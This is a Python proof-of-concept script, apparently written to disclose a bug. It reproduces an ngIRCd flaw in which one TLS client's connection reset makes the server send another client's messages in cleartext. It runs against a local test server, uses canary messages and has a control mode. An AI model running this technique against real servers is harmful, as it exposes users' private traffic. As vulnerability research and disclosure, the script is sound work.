#!/usr/bin/env python3
"""Deterministic reproducer: one client's TLS reset makes ngIRCd send another
client's output in cleartext.

Runs inside the container, next to ngircd (TLS on 6697, plain on 6667).

  B  victim. TLS over a raw socket + ssl.MemoryBIO, so every raw byte from the
     server is recorded. Registers, then STOPS READING, so the server's socket
     to B fills up and SSL_write() on B returns -1 / SSL_ERROR_WANT_WRITE.
  C  plain-text feeder (oper, +F so it isn't throttled). Sends PRIVMSGs to B
     until the kernel buffers between server and B are full (measured from
     /proc/net/tcp) and a few KB sit in ngircd's write buffer for B
     (well below the 32 KB sendq limit).
  A  trigger. Completes a TLS handshake, then closes with SO_LINGER 0 (RST).
     The server's SSL_read() on A fails, ConnSSL_Free() -> SSL_shutdown() on
     the dead socket leaves EPIPE in the OpenSSL error queue.
  Then C sends one more PRIVMSG to B: Conn_Write() -> Handle_Write() ->
  SSL_write() on B -> -1 (really WANT_WRITE). With the stale queue entry,
  SSL_get_error() says SYSCALL, ngircd frees B's TLS state, errno is still
  EAGAIN, B stays open. C sends canary lines; B starts reading again and we
  look for those canaries in the raw byte stream.

Nothing here touches ngircd's internals: the timing is controlled purely by
B not reading, so the only TLS operations between A's reset and B's write are
A's own. The test is a "control" run when --no-reset is given: A closes
cleanly (QUIT + close_notify) instead of resetting.

Verdicts:
  LEAK    canary text found in B's raw TCP stream (cleartext inside TLS)
  KILLED  server closed B (TLS intact, no cleartext)
  OK      B got every canary through TLS and is still connected
"""
import argparse, socket, ssl, struct, sys, time

HOST = "127.0.0.1"
TLS_PORT, PLAIN_PORT = 6697, 6667
PAD = "x" * 400


def ctx():
    c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


class RawTLS:
    def __init__(self, rcvbuf=None):
        self.sock = socket.socket()
        if rcvbuf:
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
        self.sock.connect((HOST, TLS_PORT))
        self.inc, self.out = ssl.MemoryBIO(), ssl.MemoryBIO()
        self.obj = ctx().wrap_bio(self.inc, self.out, server_hostname="irc.example.net")
        self.raw, self.plain = bytearray(), bytearray()
        self.tls_error, self.eof = None, False
        while True:
            try:
                self.obj.do_handshake()
                self.flush()
                break
            except ssl.SSLWantReadError:
                self.flush()
                d = self.sock.recv(65536)
                if not d:
                    raise RuntimeError("EOF in handshake")
                self.feed(d)

    def flush(self):
        d = self.out.read()
        if d:
            self.sock.sendall(d)

    def send(self, line):
        self.obj.write(line.encode() + b"\r\n")
        self.flush()

    def feed(self, d):
        self.raw += d
        if self.tls_error:
            return
        self.inc.write(d)
        while True:
            try:
                p = self.obj.read(65536)
                if not p:
                    break
                self.plain += p
            except ssl.SSLWantReadError:
                break
            except ssl.SSLError as e:
                self.tls_error = "%s" % e
                break

    def recv(self, timeout):
        self.sock.settimeout(timeout)
        try:
            d = self.sock.recv(65536)
        except socket.timeout:
            return None
        except ConnectionResetError:
            d = b""
        if not d:
            self.eof = True
        else:
            self.feed(d)
        return d

    def wait(self, needle, timeout=10):
        end = time.time() + timeout
        while needle not in self.plain:
            if time.time() > end or self.eof or self.tls_error:
                raise RuntimeError("B: timeout waiting for %r" % needle)
            self.recv(0.5)


class Plain:
    def __init__(self, nick):
        self.s = socket.create_connection((HOST, PLAIN_PORT))
        self.buf = b""
        self.nick = nick
        self.send("NICK %s" % nick)
        self.send("USER %s 0 * :%s" % (nick, nick))
        self.wait(b" 376 ")

    def send(self, l):
        self.s.sendall(l.encode() + b"\r\n")

    def wait(self, needle, timeout=10):
        self.s.settimeout(timeout)
        end = time.time() + timeout
        while needle not in self.buf:
            if time.time() > end:
                raise RuntimeError("%s: timeout waiting for %r" % (self.nick, needle))
            d = self.s.recv(65536)
            if not d:
                raise RuntimeError("%s: EOF" % self.nick)
            for l in d.split(b"\r\n"):
                if l.startswith(b"PING "):
                    self.send("PONG " + l[5:].decode())
            self.buf += d

    seq = 0

    def sync(self):
        """Round-trip a PING so the server has processed everything sent."""
        Plain.seq += 1
        tok = "sync%d" % Plain.seq
        self.send("PING :" + tok)
        self.wait(tok.encode())
        self.buf = b""


def queues(port_b):
    """(server Send-Q, B Recv-Q) for the server<->B TCP connection."""
    srv = cli = None
    for line in open("/proc/net/tcp").read().splitlines()[1:]:
        f = line.split()
        lport = int(f[1].split(":")[1], 16)
        rport = int(f[2].split(":")[1], 16)
        tx, rx = (int(x, 16) for x in f[4].split(":"))
        if lport == TLS_PORT and rport == port_b:
            srv = tx
        if lport == port_b and rport == TLS_PORT:
            cli = rx
    return srv, cli


def framing(raw):
    """Walk the TLS record layer; return (offset where it breaks, 5 header bytes there)."""
    i = 0
    while i + 5 <= len(raw):
        t, v = raw[i], (raw[i + 1] << 8) | raw[i + 2]
        if t not in (20, 21, 22, 23) or v not in (0x0301, 0x0302, 0x0303):
            return i, bytes(raw[i:i + 5])
        i += 5 + ((raw[i + 3] << 8) | raw[i + 4])
    return None, b""


def run(a):
    t0 = time.time()
    log = lambda m: print("[%5.2f] %s" % (time.time() - t0, m), flush=True)

    b = RawTLS(rcvbuf=a.rcvbuf)
    b.send("NICK b")
    b.send("USER b 0 * :victim")
    b.wait(b" 376 ")
    port_b = b.sock.getsockname()[1]
    log("B registered over TLS (local port %d), now stops reading" % port_b)

    c = Plain("c")
    c.send("OPER oper operpass")
    c.wait(b" 381 ")
    c.send("MODE c +F")
    c.sync()

    # 1. fill the kernel buffers between server and B, then put a few KB in
    #    ngircd's own write buffer for B.
    sent, stable, last = 0, 0, None
    while stable < a.stable:
        c.send("PRIVMSG b :fill%04d %s" % (sent, PAD))
        sent += 1
        c.sync()
        time.sleep(0.02)
        q = queues(port_b)
        tot = (q[0] or 0) + (q[1] or 0)
        stable = stable + 1 if last is not None and tot <= last else 0
        last = tot
        if a.verbose:
            log("fill %d: server Send-Q=%s B Recv-Q=%s" % (sent, q[0], q[1]))
        if sent > 2000:
            raise RuntimeError("kernel buffers never filled")
    for i in range(a.extra):
        c.send("PRIVMSG b :wbuf%04d %s" % (i, PAD))
        c.sync()
    q = queues(port_b)
    log("filled: %d+%d msgs sent to B; server Send-Q=%s, B Recv-Q=%s; "
        "several KB now wait in ngircd's write buffer for B" % (sent, a.extra, q[0], q[1]))

    # 2. trigger: another TLS client resets its connection.
    for attempt in range(1, a.attempts + 1):
        ar = RawTLS()
        if a.no_reset:
            ar.send("QUIT :bye")
            end = time.time() + 3
            while not ar.eof and time.time() < end:
                ar.recv(0.3)
            ar.sock.close()
        else:
            ar.sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            ar.sock.close()
        time.sleep(0.3)
        c.sync()
        # 3. one more line for B: server's SSL_write on B hits WANT_WRITE.
        c.send("PRIVMSG b :CANARY-poke%d %s" % (attempt, "y" * 40))
        c.sync()
    log("A: %d TLS client(s) %s; then 1 PRIVMSG to B after each"
        % (a.attempts, "closed cleanly" if a.no_reset else "reset (SO_LINGER 0)"))

    for i in range(5):
        c.send("PRIVMSG b :CANARY-%d this line must only ever travel encrypted" % i)
    c.sync()

    # 4. B drains everything and we inspect the raw stream.
    end = time.time() + a.drain
    while time.time() < end and not b.eof:
        b.recv(0.3)
        if b"CANARY-4" in b.plain or b"CANARY-4" in b.raw:
            # give the server a moment to send anything else
            end = min(end, time.time() + 1.0)
    alive = not b.eof and not b.tls_error
    if alive:
        try:
            b.send("PING :alive")
            b.wait(b"alive", 5)
        except Exception as e:
            alive = False
            log("B: liveness check failed: %s" % e)

    pos = b.raw.find(b"CANARY")
    if pos >= 0:
        verdict = "LEAK"
        s = max(0, b.raw.rfind(b"\n", 0, pos) - 40)
        log("CLEARTEXT on B's TLS connection at raw offset %d of %d:" % (pos, len(b.raw)))
        print("    %r" % bytes(b.raw[s:pos + 70]))
        off, hdr = framing(b.raw)
        if off is not None:
            log("TLS framing breaks at raw offset %d: header bytes %s = %r "
                "(type %d, 'version' 0x%04x)" % (off, hdr.hex(), hdr, hdr[0], (hdr[1] << 8) | hdr[2]))
    elif alive and b"CANARY-4" in b.plain:
        verdict = "OK"
    else:
        verdict = "KILLED"
    tail = bytes(b.plain[-300:]).decode(errors="replace").strip().splitlines()
    log("B: raw=%d bytes, decrypted=%d bytes, tls_error=%s, eof=%s, last line=%r"
        % (len(b.raw), len(b.plain), b.tls_error, b.eof, tail[-1] if tail else ""))
    print("VERDICT %s" % verdict, flush=True)
    return verdict


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--rcvbuf", type=int, default=4096, help="B's SO_RCVBUF")
    ap.add_argument("--extra", type=int, default=2,
                    help="messages queued in ngircd's wbuf after the kernel buffers are full")
    ap.add_argument("--stable", type=int, default=12,
                    help="consecutive messages with no growth in the kernel queues before the "
                         "socket counts as full (must be > 4096 bytes worth, so that ngircd's "
                         "own flush in Conn_Write() has hit EAGAIN at least once)")
    ap.add_argument("--attempts", type=int, default=1, help="A resets (each followed by a write to B)")
    ap.add_argument("--drain", type=float, default=8.0)
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("--no-reset", action="store_true", help="control: A quits cleanly")
    a = ap.parse_args()
    try:
        run(a)
    except Exception as e:
        print("ERROR %s" % e)
        print("VERDICT ERROR")
        sys.exit(1)
